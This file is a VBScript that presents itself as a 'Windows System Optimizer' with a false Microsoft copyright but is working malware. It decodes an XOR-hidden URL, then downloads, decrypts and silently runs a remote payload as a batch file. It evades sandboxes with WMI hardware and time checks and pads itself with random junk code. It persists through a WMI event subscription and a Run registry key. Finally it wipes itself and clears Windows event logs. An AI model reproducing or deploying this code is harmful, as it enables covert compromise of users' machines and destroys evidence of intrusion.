' Windows System Optimizer v1.2.7
' (c) 2023 Microsoft Solutions Group

Function TransformData(encryptedData, transformationKey)
    Dim processedOutput, position, keyByte
    processedOutput = ""
    For position = 1 To Len(encryptedData)
        keyByte = Asc(Mid(transformationKey, ((position-1) Mod Len(transformationKey)) + 1, 1))
        processedOutput = processedOutput & Chr(Asc(Mid(encryptedData, position, 1)) Xor keyByte)
    Next
    TransformData = processedOutput
End Function

Function VerifySystemEnvironment()
    Dim sysManagement, processors, memoryModules, displayAdapters, currentHour
    On Error Resume Next
    Set sysManagement = GetObject("winmgmts:\\.\root\cimv2")
    If Err.Number <> 0 Then Exit Function
    
    Set processors = sysManagement.ExecQuery("SELECT * FROM Win32_Processor WHERE LoadPercentage > 10")
    Set memoryModules = sysManagement.ExecQuery("SELECT * FROM Win32_PhysicalMemory WHERE Capacity > 4000000000")
    Set displayAdapters = sysManagement.ExecQuery("SELECT * FROM Win32_VideoController WHERE AdapterRAM > 100000000")
    
    currentHour = Hour(Now())
    
    VerifySystemEnvironment = (Not processors Is Nothing) And (processors.Count > 0) And _
                         (Not memoryModules Is Nothing) And (memoryModules.Count > 0) And _
                         (Not displayAdapters Is Nothing) And (displayAdapters.Count > 0) And _
                         (currentHour >= 8 And currentHour <= 18)
    On Error GoTo 0 
End Function

Function GenerateRandomOperations()
    Dim variables, operators, operationCode, counter
    variables = Array("system","temporary","object","config","environment","variable")
    operators = Array("+","-","*","/","And","Or")
    
    Randomize
    For counter = 1 To Int(Rnd * 10) + 5
        operationCode = operationCode & "Dim " & variables(Int(Rnd*6)) & Int(Rnd*1000) & ": " & _
               variables(Int(Rnd*6)) & Int(Rnd*1000) & " = " & _
               Int(Rnd*9999) & " " & operators(Int(Rnd*6)) & " " & _
               Int(Rnd*9999) & vbCrLf
    Next
    GenerateRandomOperations = operationCode
End Function

Sub ScheduleTaskExecution(commandString)
    On Error Resume Next
    Dim delayPeriod, sysManagement, executionMethod, executionParameters
    
    delayPeriod = 113 + Int(60 * Rnd())
    
    Set sysManagement = GetObject("winmgmts:\\.\root\cimv2")
    Set executionMethod = sysManagement.Get("Win32_Process").Methods_("Create")
    Set executionParameters = executionMethod.InParameters.SpawnInstance_
    
    executionParameters.CommandLine = "%COMSPEC% /c ping 127.0.0.1 -n " & (delayPeriod * 60 + 1) & _
                           " >nul & " & commandString
    
    sysManagement.ExecMethod "Win32_Process", "Create", executionParameters
    
    Execute GenerateRandomOperations()
    On Error GoTo 0
End Sub

Function HexToCharSequence(hexInput)
    Dim index, charSequence, hexPair
    charSequence = ""
    For index = 1 To Len(hexInput) Step 2
        hexPair = Mid(hexInput, index, 2)
        charSequence = charSequence & Chr(CLng("&H" & hexPair))
    Next
    HexToCharSequence = charSequence
End Function

Function LoadResourceData(resourceBytes)
    On Error Resume Next
    Dim byteStream
    Set byteStream = CreateObject("ADODB.Stream")
    If Err.Number <> 0 Then
        ' Fallback method for restricted environments
        Dim byteIndex, resourceString
        resourceString = ""
        For byteIndex = 1 To LenB(resourceBytes)
            resourceString = resourceString & Chr(AscB(MidB(resourceBytes, byteIndex, 1)))
        Next
        LoadResourceData = resourceString
        Exit Function
    End If
    byteStream.Type = 1
    byteStream.Open
    byteStream.Write resourceBytes
    byteStream.Position = 0
    byteStream.Type = 2
    byteStream.Charset = "iso-8859-1"
    LoadResourceData = byteStream.ReadText
    byteStream.Close
End Function

Sub RetrieveAndExecuteResource()
    On Error Resume Next
    Dim sysShell, encryptedLocation, processedResource, httpClient, resourceBytes, uniqueIdGenerator
    
    encryptedLocation = "3B1C15141C4D7C47060D1B1F260A4F07001A7C2C13050418251C090159033B4735261A307C0A0D0B0D583E0912100A057C18001D0318320C4F060619"
    encryptedLocation = TransformData(HexToCharSequence(encryptedLocation), "Shadow")
    
    Set httpClient = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    httpClient.setOption(2) = 13056
    httpClient.setTimeouts 30000, 60000, 30000, 120000
    httpClient.Open "GET", encryptedLocation, False
    httpClient.Send
    
    If httpClient.Status = 200 Then
        resourceBytes = httpClient.ResponseBody
        processedResource = TransformData(LoadResourceData(resourceBytes), "CmdKey")
        
        CreateTemporaryBatch processedResource
        CreatePersistentResource processedResource
    End If
    On Error GoTo 0
End Sub

Sub CreatePersistentResource(resourceContent)
    Dim fileSystem, sysShell, persistentLocation
    Set fileSystem = CreateObject("Scripting.FileSystemObject")
    Set sysShell = CreateObject("WScript.Shell")
    persistentLocation = sysShell.ExpandEnvironmentStrings("%TEMP%\SystemOptimizer.cmd")
    
    Dim resourceFile
    Set resourceFile = fileSystem.CreateTextFile(persistentLocation, True)
    resourceFile.Write resourceContent
    resourceFile.Close
End Sub

Sub CreateTemporaryBatch(resourceContent)
    Dim fileSystem, sysShell, temporaryLocation, batchScript, uniqueIdGenerator
    Set fileSystem = CreateObject("Scripting.FileSystemObject")
    Set sysShell = CreateObject("WScript.Shell")
    Set uniqueIdGenerator = CreateObject("Scriptlet.TypeLib")
    temporaryLocation = sysShell.ExpandEnvironmentStrings("%TEMP%\" & Left(uniqueIdGenerator.GUID, 8) & ".cmd")
    
    batchScript = "@echo off" & vbCrLf & _
                   "REM System Optimization Script" & vbCrLf & _
                   resourceContent & vbCrLf & _
                   "timeout /t 3 /nobreak >nul" & vbCrLf & _
                   "del /f /q """ & temporaryLocation & """"
    
    Dim batchFile
    Set batchFile = fileSystem.CreateTextFile(temporaryLocation, True)
    batchFile.Write batchScript
    batchFile.Close
    sysShell.Run """" & temporaryLocation & """", 0, False
End Sub

Sub ConfigureAutoOptimization()
    On Error Resume Next
    Dim sysShell, sysManagement, eventFilter, eventConsumer, filterBinding
    
    Set sysShell = CreateObject("WScript.Shell")
    Set sysManagement = GetObject("winmgmts:\\.\root\subscription")
    
    Set eventFilter = sysManagement.Get("__EventFilter").SpawnInstance_
    eventFilter.Name = "PerfMonitor_" & Int(Rnd * 10000)
    eventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE " & _
                  "TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
    eventFilter.Put_
    
    Set eventConsumer = sysManagement.Get("ActiveScriptEventConsumer").SpawnInstance_
    eventConsumer.Name = "SysMaintenance_" & Int(Rnd * 10000)
    eventConsumer.ScriptingEngine = "VBScript"
    eventConsumer.ScriptText = "Set shell = CreateObject(""WScript.Shell""): shell.Run """ & _
                           sysShell.ExpandEnvironmentStrings("%TEMP%\SystemOptimizer.cmd") & """, 0, False"
    eventConsumer.Put_
    
    Set filterBinding = sysManagement.Get("__FilterToConsumerBinding").SpawnInstance_
    filterBinding.Filter = eventFilter.Path_
    filterBinding.Consumer = eventConsumer.Path_
    filterBinding.Put_
    
    sysShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemOptimizer", _
                   sysShell.ExpandEnvironmentStrings("%TEMP%\SystemOptimizer.cmd"), "REG_SZ"
    On Error GoTo 0
End Sub

Sub PerformCleanupOperations()
    On Error Resume Next
    Dim fileSystem, sysShell, sysManagement, processMethod, processParams
    
    Set fileSystem = CreateObject("Scripting.FileSystemObject")
    Set sysShell = CreateObject("WScript.Shell")
    Set sysManagement = GetObject("winmgmts:\\.\root\cimv2")
    
    If fileSystem.FileExists(WScript.ScriptFullName) Then
        Dim currentFile
        Set currentFile = fileSystem.OpenTextFile(WScript.ScriptFullName, 2)
        currentFile.Write String(5000, "X")
        currentFile.Close
    End If
    
    Set processMethod = sysManagement.Get("Win32_Process").Methods_("Create")
    Set processParams = processMethod.InParameters.SpawnInstance_
    processParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del /f /q """ & WScript.ScriptFullName & """"
    sysManagement.ExecMethod "Win32_Process", "Create", processParams
    
    sysShell.Run "wevtutil cl Application", 0, True
    sysShell.Run "wevtutil cl System", 0, True
    
    WScript.Quit()
    On Error GoTo 0
End Sub

' --- Main Execution Sequence ---
On Error Resume Next
Execute GenerateRandomOperations()

If VerifySystemEnvironment() Then
    RetrieveAndExecuteResource()
    ScheduleTaskExecution("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /optimize")
    ScheduleTaskExecution("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /cleanup")
End If

If WScript.Arguments.Named.Exists("optimize") Then
    ConfigureAutoOptimization()
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    PerformCleanupOperations()
End If

Execute GenerateRandomOperations()